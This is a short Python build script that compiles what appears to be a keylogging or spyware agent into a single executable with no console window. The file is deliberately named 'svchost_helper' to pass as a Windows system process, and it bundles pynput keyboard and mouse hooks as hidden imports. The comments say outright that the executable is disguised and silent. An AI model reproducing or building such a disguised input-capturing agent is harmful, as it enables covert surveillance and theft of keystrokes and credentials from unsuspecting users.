# build.py — compiles agent to a silent .exe via PyInstaller
# Run: python build.py

import subprocess, sys, os

OUTPUT_NAME = "svchost_helper"   # disguised exe name

cmd = [
    sys.executable, "-m", "PyInstaller",
    "--onefile",                          # single exe
    "--noconsole",                        # no console window
    "--name", OUTPUT_NAME,
    "--hidden-import", "win32timezone",
    "--hidden-import", "pynput.keyboard._win32",
    "--hidden-import", "pynput.mouse._win32",
    "main.py"
]

print(f"[*] Building {OUTPUT_NAME}.exe ...")
result = subprocess.run(cmd)

if result.returncode == 0:
    print(f"\n[+] Done. Find your exe at: dist/{OUTPUT_NAME}.exe")
    print("[!] Before building — edit config.py and set your VAULT_PASSWORD")
else:
    print("\n[-] Build failed. Make sure PyInstaller is installed: pip install pyinstaller")
